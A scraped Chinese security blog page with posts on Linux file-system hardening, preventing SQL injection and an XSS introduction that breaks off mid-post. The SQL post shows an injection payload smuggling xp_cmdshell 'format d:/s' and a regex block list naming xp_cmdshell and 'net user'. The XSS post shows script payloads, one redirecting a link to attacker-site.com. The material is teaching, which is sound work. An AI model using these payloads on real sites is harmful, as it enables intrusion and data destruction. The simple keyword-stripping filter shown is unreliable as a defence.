<h3 id="5-服务端核对令牌："><a href="#5-服务端核对令牌：" class="headerlink" title="5.服务端核对令牌："></a>5.服务端核对令牌：</h3><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个很简单，这里就不再啰嗦了。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面这个其实不完全符合“并行会话的兼容”的规则，大家可以在此基础上修改。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实还有很多想写，无奈精力有限，暂且打住，日后补充，如果错漏，请指出:&gt;</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PS：今天下午写这篇文档的时候FF崩溃了一次，写了一半文章的全没了，郁闷好久T_T…….</p>
<h2 id="六-参考文献"><a href="#六-参考文献" class="headerlink" title="六.参考文献"></a>六.参考文献</h2><ol>
<li><a href="http://www.playhack.net/view.php?id=31" target="_blank" rel="external">Preventing CSRF</a></li>
<li><a href="http://shiflett.org/articles/cross-site-request-forgeries" target="_blank" rel="external">Security Corner: Cross-Site Request Forgeries</a></li>
<li><a href="http://netsecurity.51cto.com/art/200812/102951.htm" target="_blank" rel="external">《深入解析跨站请求伪造漏洞：原理剖析》</a></li>
<li><a href="http://netsecurity.51cto.com/art/200811/97281.htm" target="_blank" rel="external">《Web安全测试之跨站请求伪造（CSRF）》</a></li>
<li><a href="http://netsecurity.51cto.com/art/200812/102925.htm" target="_blank" rel="external">《深入解析跨站请求伪造漏洞：实例讲解》</a></li>
<li><a href="http://baike.baidu.com/view/1609487.htm" target="_blank" rel="external">CSRF</a></li>
</ol>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux安全/">Linux安全</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-Linux安全/14. 文件系统安全" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/09/03/Linux安全/14. 文件系统安全/" class="article-date">
  	<time datetime="2017-09-02T18:04:46.018Z" itemprop="datePublished">2017-09-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/03/Linux安全/14. 文件系统安全/">
        文件系统安全
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="一、锁定系统重要文件"><a href="#一、锁定系统重要文件" class="headerlink" title="一、锁定系统重要文件"></a>一、锁定系统重要文件</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统运维人员有时候可能会遇到通过root用户都不能修改或者删除某个文件的情况，产生这种情况的大部分原因可能是这个文件被锁定了。在Linux下锁定文件的命令是chattr，通过这个命令可以修改ext2、ext3、ext4文件系统下文件属性，但是这个命令必须有超级用户root来执行。和这个命令对应的命令是lsattr，这个命令用来查询文件属性。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过chattr命令修改文件或者目录的文件属性能够提高系统的安全性，下面简单介绍下chattr和lsattr两个命令的用法。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chattr命令的语法格式如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chattr [-RV] [-v version] [mode] 文件或目录</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主要参数含义如下：</p>
<ul>
<li>-R：递归修改所有的文件及子目录。</li>
<li>-V：详细显示修改内容，并打印输出。</li>
</ul>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中mode部分用来控制文件的属性，常用参数如下表所示：</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参数含义</p>
<ul>
<li><ul>
<li>：在原有参数设定基础上，追加参数</li>
</ul>
</li>
<li><ul>
<li>：在原有参数设定基础上，移除参数</li>
</ul>
</li>
<li>=：更新为指定参数</li>
<li>a：即append，设定该参数后，只能向文件中添加数据，而不能删除。常用于服务器日志文件安全，只有root用户才能设置这个属性</li>
<li>c：即compresse，设定文件是否经压缩后再存储。读取时需要经过自动解压操作</li>
<li>i ：即immutable，设定文件不能被修改、删除、重命名、设定链接等，同时不能写入或新增内容。这个参数对于文件系统的安全设置有很大帮助</li>
<li>s：安全的删除文件或目录，即文件被删除后硬盘空间被全部收回</li>
<li>u：与s参数相反，当设定为u时，系统会保留其数据块以便以后能够恢复删除这个文件。这些参数中，最常用到的是a和i，a参数常用于服务器日志文件安全设定，而i参数更为严格，不允许对文件进行任何操作，即使是root用户</li>
</ul>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lsattr用来查询文件属性，用法比较简单，其语法格式如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsattr [-adlRvV] 文件或目录</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常用参数如下表所示。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参数含义</p>
<ul>
<li>-a：列出目录中的所有文件，包括以.开头的文件</li>
<li>-d：显示指定目录的属性</li>
<li>-R：以递归的方式列出目录下所有文件及子目录以及属性值</li>
<li>-v：显示文件或目录版本</li>
</ul>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux系统中，如果一个用户以root的权限登录或者某个进程以root的权限运行，那么它的使用权限就不再有任何的限制了。因此，攻击者通过远程或者本地攻击手段获得了系统的root权限将是一个灾难。在这种情况下，文件系统将是保护系统安全的最后一道防线，合理的属性设置可以最大限度地减小攻击者对系统的破坏程度，通过chattr命令锁定系统一些重要的文件或目录，是保护文件系统安全最直接、最有效的手段。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对一些重要的目录和文件可以加上“i”属性，常见的文件和目录有：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">chattr -R +i /bin /boot /lib /sbin</div><div class="line">chattr -R +i /usr/bin /usr/include /usr/lib /usr/sbin</div><div class="line">chattr +i /etc/passwd</div><div class="line">chattr +i /etc/shadow</div><div class="line">chattr +i /etc/hosts</div><div class="line">chattr +i /etc/resolv.conf</div><div class="line">chattr +i /etc/fstab</div><div class="line">chattr +i /etc/sudoers</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对一些重要的日志文件可以加上“a”属性，常见的有：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chattr +a /var/<span class="built_in">log</span>/messages</div><div class="line">chattr +a /var/<span class="built_in">log</span>/wtmp</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对重要的文件进行加锁，虽然能够提高服务器的安全性，但是也会带来一些不便，例如，在软件的安装、升级时可能需要去掉有关目录和文件的immutable属性和append-only属性，同时，对日志文件设置了append-only属性，可能会使日志轮换(logrotate)无法进行。因此，在使用chattr命令前，需要结合服务器的应用环境来权衡是否需要设置immutable属性和append-only属性。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，虽然通过chattr命令修改文件属性能够提高文件系统的安全性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var等目录。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根目录不能有不可修改属性，因为如果根目录具有不可修改属性，那么系统根本无法工作：/dev在启动时，syslog需要删除并重新建立/dev/log套接字设备，如果设置了不可修改属性，那么可能出问题；/tmp目录会有很多应用程序和系统程序需要在这个目录下建立临时文件，也不能设置不可修改属性；/var是系统和程序的日志目录，如果设置为不可修改属性，那么系统写日志将无法进行，所以也不能通过chattr命令保护。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;虽然通过chattr命令无法保护/dev、/tmp等目录的安全性，但是有另外的方法可以实现，在面将做详细介绍。</p>
<h2 id="二、文件权限检查和修改"><a href="#二、文件权限检查和修改" class="headerlink" title="二、文件权限检查和修改"></a>二、文件权限检查和修改</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不正确的权限设置直接威胁着系统的安全，因此运维人员应该能及时发现这些不正确的权限设置，并立刻修正，防患于未然。下面列举几种查找系统不安全权限的方法。</p>
<ol>
<li>查找系统中任何用户都有写权限的文件或目录</li>
</ol>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find / -<span class="built_in">type</span> f -perm -2 -o -perm -20 |xargs ls -al</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find / -<span class="built_in">type</span> d -perm -2 -o -perm -20 |xargs ls –ld</div></pre></td></tr></table></figure>
<ol>
<li>查找系统中所有含“s”位的程序</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find / -<span class="built_in">type</span> f -perm -4000 -o -perm -2000 -<span class="built_in">print</span> | xargs ls –al</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;含有“s”位权限的程序对系统安全威胁很大，通过查找系统中所有具有“s”位权限的程序，可以把某些不必要的“s”位程序去掉，这样可以防止用户滥用权限或提升权限的可能性。</p>
<ol>
<li>检查系统中所有suid及sgid文件</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">find / -user root -perm -2000 -<span class="built_in">print</span> -<span class="built_in">exec</span> md5sum &#123;&#125; \;</div><div class="line">find / -user root -perm -4000 -<span class="built_in">print</span> -<span class="built_in">exec</span> md5sum &#123;&#125; \;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将检查的结果保存到文件中，可在以后的系统检查中作为参考。</p>
<ol>
<li>检查系统中没有属主的文件</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find / -nouser -o –nogroup</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;没有属主的孤儿文件比较危险，往往成为黑客利用的工具，因此找到这些文件后，要么删除掉，要么修改文件的属主，使其处于安全状态。</p>
<h2 id="三、-tmp、-var-tmp、-dev-shm安全设定"><a href="#三、-tmp、-var-tmp、-dev-shm安全设定" class="headerlink" title="三、/tmp、/var/tmp、/dev/shm安全设定"></a>三、/tmp、/var/tmp、/dev/shm安全设定</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux系统中，主要有两个目录或分区用来存放临时文件，分别是/tmp和/var/tmp。存储临时文件的目录或分区有个共同点就是所有用户可读写、可执行，这就为系统留下了安全隐患。攻击者可以将病毒或者木马脚本放到临时文件的目录下进行信息收集或伪装，严重影响服务器的安全，此时，如果修改临时目录的读写执行权限，还有可能影响系统上应用程序的正常运行，因此，如果要兼顾两者，就需要对这两个目录或分区就行特殊的设置。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/dev/shm是Linux下的一个共享内存设备，在Linux启动的时候系统默认会加载/dev/shm，被加载的/dev/shm使用的是tmpfs文件系统，而tmpfs是一个内存文件系统，存储到tmpfs文件系统的数据会完全驻留在RAM中，这样通过/dev/shm就可以直接操控系统内存，这将非常危险，因此如何保证/dev/shm安全也至关重要。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于/tmp的安全设置，需要看/tmp是一个独立磁盘分区，还是一个根分区下的文件夹，如果/tmp是一个独立的磁盘分区，那么设置非常简单，修改/etc/fstab文件中/tmp分区对应的挂载属性，加上nosuid、noexec、nodev三个选项即可，修改后的/tmp分区挂载属性类似如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LABEL=/tmp     /tmp          ext3    rw,nosuid,noexec,nodev   0 0</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中，nosuid、noexec、nodev选项，表示不允许任何suid程序，并且在这个分区不能执行任何脚本等程序，并且不存在设备文件。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在挂载属性设置完成后，重新挂载/tmp分区，保证设置生效。<br>对于/var/tmp，如果是独立分区，安装/tmp的设置方法是修改/etc/fstab文件即可；如果是/var分区下的一个目录，那么可以将/var/tmp目录下所有数据移动到/tmp分区下，然后在/var下做一个指向/tmp的软连接即可。也就是执行如下操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@server ~]<span class="comment"># mv /var/tmp/* /tmp</span></div><div class="line">[root@server ~]<span class="comment"># ln -s /tmp /var/tmp</span></div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果/tmp是根目录下的一个目录，那么设置稍微复杂，可以通过创建一个loopback文件系统来利用Linux内核的loopback特性将文件系统挂载到/tmp下，然后在挂载时指定限制加载选项即可。一个简单的操作示例如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@server ~]<span class="comment"># dd if=/dev/zero of=/dev/tmpfs bs=1M count=10000</span></div><div class="line">[root@server ~]<span class="comment"># mke2fs -j /dev/tmpfs</span></div><div class="line">[root@server ~]<span class="comment"># cp -av /tmp /tmp.old</span></div><div class="line">[root@server ~]<span class="comment"># mount -o loop,noexec,nosuid,rw /dev/tmpfs /tmp</span></div><div class="line">[root@server ~]<span class="comment"># chmod 1777 /tmp</span></div><div class="line">[root@server ~]<span class="comment"># mv -f /tmp.old/* /tmp/</span></div><div class="line">[root@server ~]<span class="comment"># rm -rf /tmp.old</span></div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后，编辑/etc/fstab，添加如下内容，以便系统在启动时自动加载loopback文件系统：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/dev/tmpfs /tmp ext3 loop,nosuid,noexec,rw 0 0</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了验证一下挂载时指定限制加载选项是否生效，可以在/tmp分区创建一个shell文件，操作如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[root@tc193 tmp]<span class="comment"># ls -al|grep shell</span></div><div class="line">-rwxr-xr-x 1 root root 22 Oct 6 14:58 shell-test.sh</div><div class="line">[root@server ~]<span class="comment"># pwd</span></div><div class="line">/tmp</div><div class="line">[root@tc193 tmp]<span class="comment"># ./shell-test.sh</span></div><div class="line">-bash: ./shell-test.sh: Permission denied</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看出，虽然文件有可执行属性，但是已经在/tmp分区无法执行任何文件了。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后，再来修改一下/dev/shm的安全设置。由于/dev/shm是一个共享内存设备，因此也可以通过修改/etc/fstab文件设置而实现，在默认情况下，/dev/shm通过defaults选项来加载，对保证其安全性是不够    的，修改/dev/shm的挂载属性，操作如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tmpfs   /dev/shm    tmpfs   defaults,nosuid,noexec,rw  0 0</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过这种方式，就限制了任何suid程序，同时也限制了/dev/shm的可执行权限，系统安全性得到进一步提升。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux安全/">Linux安全</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-Linux安全/12. 防止SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/09/03/Linux安全/12. 防止SQL注入/" class="article-date">
  	<time datetime="2017-09-02T18:04:46.017Z" itemprop="datePublished">2017-09-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/03/Linux安全/12. 防止SQL注入/">
        防止SQL注入
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个恐怖的例子：</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注入式攻击的详细解释SQL下面我们将以一个简单的用户登陆为例，结合代码详细解释一下SQL注入式攻击，与及他的防范措施。对于一个简单的用户登陆可能的代码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">try</div><div class="line">&#123;</div><div class="line">　string strUserName = this.txtUserName.Text;</div><div class="line">　string strPwd = this.txtPwd.Text;</div><div class="line">　string strSql = <span class="string">"select * from userinfo where UserName='"</span> + strUserName + <span class="string">"' and Password='"</span> + strPwd + <span class="string">"'"</span>;</div><div class="line">　SqlConnection objDbConn = new SqlConnection(<span class="string">"数据库连接字符串"</span>);</div><div class="line">　SqlDataAdapter objAdapter = new SqlDataAdapter(strSql,objDbConn);</div><div class="line">　DataSet objDataSet = null;</div><div class="line">　objAdapter.Fill(objDataSet);//TODO 对获取的数据进行判断。</div><div class="line">&#125;</div><div class="line">catch (System.Exception e)</div><div class="line">&#123;</div><div class="line">　this.lblMsg.Text = e.Message;</div><div class="line">　this.lblMsg.Visible = <span class="literal">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在上面这段代码中，如果用户的输入是正常的用户名和密码的话，那么执行都会比较正常，但是，假如输入用户名的时候，输入的是“johny’–”的话，在 SQLServer里面执行的语句将会是“select * from userinfo where UserName=’johny’–‘ and Password=’密码’”，只要数据库中存在johny这个用户的话，那么不管密码是什么，语句都能够执行成功，并且能够顺利通过登陆。还 有更加厉害的，我们知道SQLServer里面有一些系统的存储过程，能够执行操作系统的很多命令，比如xp_cmdshell，假如上面用户登陆的时 候，用户名部分输入的是“johny’ exec xp_cmdshell ‘format d:/s’–”，大家想想一下后果是什么？有恶意的用户，只要把’format d:/s’这个命令稍加改造就能够做很多不合法的事情。</p>
<h2 id="NET防SQL注入方法"><a href="#NET防SQL注入方法" class="headerlink" title=".NET防SQL注入方法"></a>.NET防SQL注入方法</h2><h3 id="1-利用SqlCommand传参数的方法："><a href="#1-利用SqlCommand传参数的方法：" class="headerlink" title="1.利用SqlCommand传参数的方法："></a>1.利用SqlCommand传参数的方法：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">string strSQL=<span class="string">"SELECT * FROM [user] WHERE user_id=@id"</span>;</div><div class="line">SqlCommand cmd = new SqlCommand();</div><div class="line">cmd.CommandText = strSQL;</div><div class="line">cmd.Parameters.Add(<span class="string">"@id"</span>,SqlDbType.VarChar,20).Value=Request[<span class="string">"id"</span>].ToString();</div></pre></td></tr></table></figure>
<h3 id="2-过滤禁止运行法："><a href="#2-过滤禁止运行法：" class="headerlink" title="2.过滤禁止运行法："></a>2.过滤禁止运行法：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">/// &lt;summary&gt;</div><div class="line">/// 过滤SQL语句,防止注入</div><div class="line">/// &lt;/summary&gt;</div><div class="line">/// &lt;param name=<span class="string">"strSql"</span>&gt;&lt;/param&gt;</div><div class="line">/// &lt;returns&gt;0 - 没有注入, 1 - 有注入 &lt;/returns&gt;</div><div class="line">public int filterSql(string sSql)</div><div class="line">&#123; </div><div class="line"> int srcLen, decLen = 0;</div><div class="line"> sSql = sSql.ToLower().Trim();</div><div class="line"> srcLen = sSql.Length;</div><div class="line"> sSql = sSql.Replace(<span class="string">"exec"</span>, <span class="string">""</span>);</div><div class="line"> sSql = sSql.Replace(<span class="string">"delete"</span>, <span class="string">""</span>);</div><div class="line"> sSql = sSql.Replace(<span class="string">"master"</span>, <span class="string">""</span>);</div><div class="line"> sSql = sSql.Replace(<span class="string">"truncate"</span>, <span class="string">""</span>);</div><div class="line"> sSql = sSql.Replace(<span class="string">"declare"</span>, <span class="string">""</span>);</div><div class="line"> sSql = sSql.Replace(<span class="string">"create"</span>, <span class="string">""</span>);</div><div class="line"> sSql = sSql.Replace(<span class="string">"xp_"</span>, <span class="string">"no"</span>);</div><div class="line"> decLen = sSql.Length;</div><div class="line"> <span class="keyword">if</span> (srcLen == decLen) <span class="built_in">return</span> 0; <span class="keyword">else</span> <span class="built_in">return</span> 1; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="3-存储过程"><a href="#3-存储过程" class="headerlink" title="3.存储过程"></a>3.存储过程</h3><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;js版的防范SQL注入式攻击代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"javascript"</span>&gt;</div><div class="line">&lt;!--</div><div class="line">var url = location.search;</div><div class="line">var re=/^\?(.*)(select%20|insert%20|delete%20from%20|count\(|drop%20table|update%20truncate%20|asc\(|mid\(|char\(|xp_cmdshell|<span class="built_in">exec</span>%20master|net%20localgroup%20administrators|\<span class="string">"|:|net%20user|\|%20or%20)(.*)$/gi;</span></div><div class="line"><span class="string">var e = re.test(url);</span></div><div class="line"><span class="string">if(e) &#123;</span></div><div class="line"><span class="string"> alert("</span>地址中含有非法字符～<span class="string">");</span></div><div class="line"><span class="string"> location.href="</span>error.asp<span class="string">";</span></div><div class="line"><span class="string">&#125;</span></div><div class="line"><span class="string">//--&gt;</span></div><div class="line"><span class="string">&lt;script&gt;</span></div></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux安全/">Linux安全</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-Linux安全/11. xss攻击入门" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/09/03/Linux安全/11. xss攻击入门/" class="article-date">
  	<time datetime="2017-09-02T18:04:46.016Z" itemprop="datePublished">2017-09-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/03/Linux安全/11. xss攻击入门/">
        xss攻击入门
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;xss攻击可以分成两种类型：</p>
<ul>
<li>非持久型攻击</li>
<li>持久型攻击</li>
</ul>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面我们通过具体例子，了解两种类型xss攻击。</p>
<h2 id="1-非持久型xss攻击"><a href="#1-非持久型xss攻击" class="headerlink" title="1.非持久型xss攻击"></a>1.非持久型xss攻击</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假设有以下index.php页面：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">'name'</span>];</div><div class="line"><span class="built_in">echo</span> <span class="string">"Welcome <span class="variable">$name</span>&lt;br&gt;"</span>;</div><div class="line"><span class="built_in">echo</span> <span class="string">"&lt;a href="</span>http://www.cnblogs.com/bangerlee/<span class="string">"&gt;Click to Download&lt;/a&gt;"</span>;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该页面显示两行信息：</p>
<ul>
<li>从URI获取 ‘name’ 参数，并在页面显示</li>
<li>显示跳转到一条URL的链接</li>
</ul>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时，当攻击者给出以下URL链接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?name=guest&lt;script&gt;alert(<span class="string">'attacked'</span>)&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当用户点击该链接时，将产生以下html代码，带’attacked’的告警提示框弹出：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Welcome guest</div><div class="line">&lt;script&gt;alert(<span class="string">'attacked'</span>)&lt;/script&gt;</div><div class="line">&lt;br&gt;</div><div class="line">&lt;a href=<span class="string">'http://www.cnblogs.com/bangerlee/'</span>&gt;Click to Download&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了插入alert代码，攻击者还可以通过以下URL实现修改链接的目的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">index.php?name=</div><div class="line">&lt;script&gt;</div><div class="line">window.onload = <span class="function"><span class="title">function</span></span>() &#123;</div><div class="line">var link=document.getElementsByTagName(<span class="string">"a"</span>);link[0].href=<span class="string">"http://attacker-site.com/"</span>;&#125;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当用户点击以上攻击者提供的URL时，index.php页面被植入脚本，页面源码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Welcome </div><div class="line">&lt;script&gt;</div><div class="line">window.onload = <span class="function"><span class="title">function</span></span>() &#123;</div><div class="line">var link=document.getElementsByTagName(<span class="string">"a"</span>);link[0].href=<span class="string">"http://attacker-site.com/"</span>;&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;br&gt;</div><div class="line">&lt;a href=<span class="string">'http://www.cnblogs.com/bangerlee/'</span>&gt;Click to Download&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户再点击 “Click to Download” 时，将跳转至攻击者提供的链接。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于用于攻击的URL，攻击者一般不会直接使用以上可读形式，而是将其转换成ASCII码，以下URL同样用于实现链接地址变更：</p>
